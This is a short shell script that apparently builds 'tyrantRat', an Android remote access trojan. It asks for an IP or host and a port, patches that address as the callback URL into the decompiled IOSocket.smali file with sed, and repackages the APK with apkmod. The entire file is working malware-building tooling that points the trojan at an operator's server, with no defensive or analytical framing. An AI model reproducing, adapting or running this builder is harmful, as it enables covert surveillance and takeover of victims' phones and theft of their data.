#!/usr/bin/env sh

smaliFile="smali/com/greyhat/tyrantrat/IOSocket.smali"

if [ -d $PREFIX/share/tyrantRat -a -d $HOME/tyrantRat ]; then
    echo "[!] You installed tyrantRat before so please remove that first"
    exit 1
elif [ -d $PREFIX/share/tyrantRat ]; then
    appPath="$PREFIX/share/tyrantRat/server/app/factory/decompiled"
else
    appPath="$HOME/tyrantRat/server/app/factory/decompiled"
fi

read -p "[*] IP/URL/HOST : " host        
read -p "[*] PORT : " port

sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile

apkmod -R "$appPath" -o ~/tyrantRat/tyrantRat.apk